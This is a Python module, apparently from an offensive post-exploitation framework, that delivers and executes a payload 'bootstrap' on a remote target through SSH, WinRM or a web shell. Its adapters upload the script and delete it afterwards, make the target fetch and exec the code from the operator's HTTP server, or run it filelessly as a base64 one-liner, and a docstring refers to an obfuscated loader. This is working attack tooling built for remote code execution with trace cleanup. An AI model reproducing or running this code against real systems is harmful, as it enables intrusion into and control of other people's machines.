"""Delivery adapters for executing a bundle bootstrap on a remote target.

Architecture
------------
All delivery is handled through :class:`BundleAdapter` implementations.
Three built-in adapters cover the most common scenarios:

* :class:`UploadAdapter`  — SCP/upload + exec (SSH, WinRM, WebShell with upload)
* :class:`HttpAdapter`    — local HTTP server + remote Python urllib fetch+exec
                            (works without upload support, without bash, without curl)
* :class:`InlineAdapter`  — embed bootstrap as base64 in a ``python -c`` one-liner
                            (small scripts only; no file I/O on the remote)

Users may implement their own adapter by satisfying the :class:`BundleAdapter`
protocol:

    class MyAdapter:
        def deliver(self, bootstrap: str) -> str:
            # write bootstrap to the target however you like, return stdout
            ...

    deliver_and_run(runner, payload, adapter=MyAdapter())
"""

from __future__ import annotations

import base64
import tempfile
from pathlib import Path
from typing import Protocol, runtime_checkable

from .analyzer import BundleError

__all__ = [
    "BundleAdapter",
    "UploadAdapter",
    "HttpAdapter",
    "InlineAdapter",
    "DeliveryError",
    "make_adapter",
    "deliver_and_run",
]

# ---------------------------------------------------------------------------
# Exceptions
# ---------------------------------------------------------------------------


class DeliveryError(BundleError):
    """Raised when remote delivery or execution fails."""


# ---------------------------------------------------------------------------
# Adapter protocol — implement this to write a custom delivery handler
# ---------------------------------------------------------------------------


@runtime_checkable
class BundleAdapter(Protocol):
    """Protocol for bundle delivery adapters.

    Implement :meth:`deliver` to write a custom delivery back-end.  The method
    receives the complete Python bootstrap source and must return the remote
    execution output.

    Example::

        class MyAdapter:
            def __init__(self, runner):
                self.runner = runner

            def deliver(self, bootstrap: str) -> str:
                # custom delivery logic
                self.runner.run(f"echo '{bootstrap}' > /tmp/t.py")
                return self.runner.run("python3 /tmp/t.py")
    """

    def deliver(self, bootstrap: str) -> str:  # pragma: no cover
        """Deliver *bootstrap* and return execution output."""
        ...


# ---------------------------------------------------------------------------
# Built-in adapters
# ---------------------------------------------------------------------------


class UploadAdapter:
    """Deliver via runner.upload() + runner.run().

    Writes the bootstrap to a local temp file, uploads it to the remote
    target, executes it, and removes the remote file.  Works with any runner
    that implements :meth:`~ofx.api.post.base.PostRunnerBase.upload`:
    :class:`~ofx.api.post.runners.ssh.PostSSH`,
    :class:`~ofx.api.post.runners.winrm.PostWinRM`,
    :class:`~ofx.api.post.runners.webshell.PostWebShell` (when the web shell
    client supports file upload), etc.

    Args:
        runner: A runner instance with working ``upload()`` and ``run()``.
        remote_tmp: Destination path on the remote target.
        python: Python interpreter name on the remote host.
        windows: Set ``True`` for Windows targets — adjusts the delete command
            and defaults *python* to ``"python"`` when not explicitly set.
    """

    def __init__(
        self,
        runner,
        *,
        remote_tmp: str = "/tmp/.tmp_runner.py",
        python: str | None = None,
        windows: bool = False,
    ) -> None:
        self.runner = runner
        self.remote_tmp = remote_tmp
        self.windows = windows
        self.python = python or ("python" if windows else "python3")

    def deliver(self, bootstrap: str) -> str:
        with tempfile.NamedTemporaryFile(
            suffix=".py",
            prefix=".tmp_b_",
            delete=False,
            mode="w",
            encoding="utf-8",
        ) as fh:
            fh.write(bootstrap)
            local_path = fh.name

        try:
            self.runner.upload(local_path, self.remote_tmp)
            output = self.runner.run(f"{self.python} {self.remote_tmp}")
            # Clean up remote temp file (best effort)
            try:
                if self.windows:
                    self.runner.run(f"del /f /q {self.remote_tmp}")
                else:
                    self.runner.run(f"rm -f {self.remote_tmp}")
            except Exception:
                pass
            return output
        finally:
            Path(local_path).unlink(missing_ok=True)


class HttpAdapter:
    """Deliver by serving bootstrap over a local HTTP server.

    Starts a :class:`~ofx.api.httpserver.payload.PayloadServer` on the local
    machine, then triggers a Python ``urllib.request`` fetch-and-exec on the
    remote side:

    .. code-block:: python

        python3 -c "import urllib.request as r; exec(r.urlopen('http://...').read().decode())"

    This requires **no upload support**, **no bash** (works via web shells,
    WMI, etc.), and **no curl** on the remote host — only a Python interpreter.

    Args:
        runner: Any runner with a working ``run()`` method.
        host: Local IP to bind the HTTP server to.
        port: Local port for the HTTP server.
        route: URL path at which the bootstrap is served.
        python: Python interpreter name on the remote host.
        windows: When ``True``, defaults *python* to ``"python"``.
    """

    def __init__(
        self,
        runner,
        *,
        host: str = "0.0.0.0",
        port: int = 8888,
        route: str = "/run",
        python: str | None = None,
        windows: bool = False,
    ) -> None:
        self.runner = runner
        self.host = host
        self.port = port
        self.route = route
        self.windows = windows
        self.python = python or ("python" if windows else "python3")

    def deliver(self, bootstrap: str) -> str:
        from ofx.api.httpserver.payload import PayloadServer

        server = PayloadServer(host=self.host, port=self.port)
        server.add_payload(self.route, content=bootstrap)
        server.start()
        try:
            url = f"http://{self.host}:{self.port}{self.route}"
            # urllib.request is stdlib — no curl, no bash process substitution needed.
            cmd = (
                f'{self.python} -c '
                f'"import urllib.request as _r; '
                f'exec(_r.urlopen({url!r}).read().decode())"'
            )
            return self.runner.run(cmd)
        finally:
            server.stop()
            server.remove_payload(self.route)


class InlineAdapter:
    """Deliver by embedding the bootstrap as base64 inside a ``python -c`` command.

    The entire bootstrap is base64-encoded and passed directly to the remote
    interpreter as a one-liner.  No file is written to disk on the remote side
    and no network connectivity is required from the target.

    .. warning::
        Most shells cap command-line length (ARG_MAX ≈ 2 MB on Linux).  Use
        this adapter only with the **obfuscated loader** (which is compact) or
        with small scripts.  The raw bootstrap containing a full module archive
        will exceed shell limits.

    Args:
        runner: Any runner with a working ``run()`` method.
        python: Python interpreter name on the remote host.
        windows: When ``True``, defaults *python* to ``"python"``.
    """

    def __init__(
        self,
        runner,
        *,
        python: str | None = None,
        windows: bool = False,
    ) -> None:
        self.runner = runner
        self.windows = windows
        self.python = python or ("python" if windows else "python3")

    def deliver(self, bootstrap: str) -> str:
        b64 = base64.b64encode(bootstrap.encode()).decode()
        cmd = (
            f'{self.python} -c '
            f'"import base64 as _b, sys as _s; '
            f'exec(_b.b64decode({b64!r}).decode())"'
        )
        return self.runner.run(cmd)


# ---------------------------------------------------------------------------
# Auto-detection helpers
# ---------------------------------------------------------------------------


def _runner_has_upload(runner) -> bool:
    """Return True if *runner* has a real ``upload()`` implementation.

    Detects whether the runner class has overridden the default
    :class:`~ofx.api.post.base.PostRunnerBase` stub that raises
    ``NotImplementedError``.
    """
    try:
        from ofx.api.post.base import PostRunnerBase

        return type(runner).upload is not PostRunnerBase.upload
    except Exception:
        # If base class can't be imported (custom runner), assume upload exists
        return hasattr(runner, "upload") and callable(runner.upload)


def make_adapter(
    runner,
    method: str = "auto",
    *,
    remote_tmp: str = "/tmp/ofx_runner.py",
    python: str | None = None,
    windows: bool = False,
    http_host: str = "0.0.0.0",
    http_port: int = 8888,
    http_route: str = "/run",
) -> BundleAdapter:
    """Instantiate the appropriate delivery adapter.

    Args:
        runner: A runner instance (:class:`~ofx.api.post.base.PostRunnerBase`
            or any object with ``run()`` and optionally ``upload()``).
        method: ``"auto"`` (default) selects :class:`UploadAdapter` when the
            runner supports upload, otherwise :class:`HttpAdapter`.
            ``"upload"``, ``"http"``, or ``"inline"`` force a specific adapter.
        remote_tmp: Remote temp path (``upload`` adapter).
        python: Remote Python interpreter name.  Auto-detected from *windows*.
        windows: Adjust commands for Windows targets.
        http_host: Local bind address (``http`` adapter).
        http_port: Local port (``http`` adapter).
        http_route: URL route (``http`` adapter).

    Returns:
        A ready-to-use :class:`BundleAdapter` instance.

    Raises:
        ValueError: If *method* is not a recognised string.
    """
    upload_kwargs = dict(remote_tmp=remote_tmp, python=python, windows=windows)
    http_kwargs = dict(host=http_host, port=http_port, route=http_route, python=python, windows=windows)
    inline_kwargs = dict(python=python, windows=windows)

    if method == "upload":
        return UploadAdapter(runner, **upload_kwargs)
    if method == "http":
        return HttpAdapter(runner, **http_kwargs)
    if method == "inline":
        return InlineAdapter(runner, **inline_kwargs)
    if method == "auto":
        if _runner_has_upload(runner):
            return UploadAdapter(runner, **upload_kwargs)
        return HttpAdapter(runner, **http_kwargs)
    raise ValueError(
        f"Unknown delivery method: {method!r}. "
        "Choose 'auto', 'upload', 'http', or 'inline'."
    )


# ---------------------------------------------------------------------------
# Public entry-point
# ---------------------------------------------------------------------------


def deliver_and_run(
    runner,
    bootstrap: str,
    *,
    adapter: BundleAdapter | None = None,
    method: str = "auto",
    remote_tmp: str = "/tmp/ofx_runner.py",
    python: str | None = None,
    windows: bool = False,
    http_host: str = "0.0.0.0",
    http_port: int = 8888,
    http_route: str = "/run",
) -> str:
    """Deliver *bootstrap* to the remote target and execute it.

    Selects and invokes a delivery adapter.  Pass a custom *adapter* instance
    to use your own delivery logic.

    Args:
        runner: A runner instance with at least a ``run()`` method.
        bootstrap: Python script to deliver (plain or obfuscated bootstrap).
        adapter: An explicit :class:`BundleAdapter` instance.  When provided,
            all other adapter-selection parameters are ignored.
        method: Adapter selection when *adapter* is ``None``:

            * ``"auto"`` — :class:`UploadAdapter` if runner has upload,
              otherwise :class:`HttpAdapter`.
            * ``"upload"`` — always :class:`UploadAdapter`.
            * ``"http"``   — always :class:`HttpAdapter`.
            * ``"inline"`` — always :class:`InlineAdapter` (small scripts only).

        remote_tmp: Remote temp path (``upload`` method).
        python: Remote Python interpreter name.
        windows: Adjust commands for Windows targets.
        http_host: Local IP to bind the HTTP server (``http`` method).
        http_port: Local port for the HTTP server (``http`` method).
        http_route: URL route for the payload (``http`` method).

    Returns:
        stdout/stderr captured from remote execution.

    Raises:
        DeliveryError: On any delivery or execution failure.
        ValueError: For unknown *method* strings.
    """
    if adapter is None:
        adapter = make_adapter(
            runner,
            method,
            remote_tmp=remote_tmp,
            python=python,
            windows=windows,
            http_host=http_host,
            http_port=http_port,
            http_route=http_route,
        )

    try:
        return adapter.deliver(bootstrap)
    except DeliveryError:
        raise
    except Exception as exc:
        raise DeliveryError(f"Delivery failed [{type(adapter).__name__}]: {exc}") from exc
